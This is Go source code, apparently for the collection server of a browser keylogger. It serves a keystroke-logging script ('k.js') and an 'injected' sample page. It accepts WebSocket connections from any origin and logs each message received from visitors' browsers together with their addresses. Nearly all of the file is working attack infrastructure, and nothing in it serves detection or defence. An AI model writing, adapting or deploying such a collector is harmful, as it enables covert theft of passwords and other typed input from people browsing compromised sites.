package main

import (
	"flag"
	"html/template"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
)

var (
	listenAddr string
	wsAddr     string
	jsTemplate *template.Template
	indexTemplate *template.Template
)

var httpUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true // allow * origins
	},
}

func init() {
	log.Info("Init, getting and setting args")
	flag.StringVar(&listenAddr, "laddr", "", "Address to listen on")
	flag.StringVar(&wsAddr, "wsaddr", "", "Address for WebSocket connection")
	flag.Parse()
	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		log.Fatal(err)
	}
	indexTemplate, err = template.ParseFiles("index.html")
	if err != nil {
		log.Fatal(err)
	}
}

func serveWS(w http.ResponseWriter, r *http.Request) {
	conn, err := httpUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error(err)
		http.Error(w, err.Error(), 500)
		return
	}
	defer conn.Close()
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Error(err)
			return
		}
		log.Infof("From %s > [%s]", conn.RemoteAddr(), string(msg))
	}
}

func serveKeyStrokeJSFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	jsTemplate.Execute(w, struct {
		WS_remote_addr string
	}{wsAddr})
}

func serveSampleIndexFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	indexTemplate.Execute(w, struct {
		RemoteAddr string
	}{listenAddr})
}

func welcome(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		log.Infof("Connection from %s", r.RemoteAddr)
		next.ServeHTTP(w, r)
	})
}

func main() {
	rootRouter := mux.NewRouter()

	wsRouter := rootRouter.Path("/ws"). Subrouter()
	wsRouter.HandleFunc("", serveWS)
	wsRouter.Use(welcome)

	rootRouter.HandleFunc("/sample", serveSampleIndexFile) // serve the injected sample html
	rootRouter.HandleFunc("/k.js", serveKeyStrokeJSFile)
	log.Infof("Starting websocket server on :%s", listenAddr)
	log.Fatal(http.ListenAndServe(listenAddr, rootRouter))
}

// ex. main.go -laddr=127.0.0.1:8080 -wsaddr=10.0.0.1:8080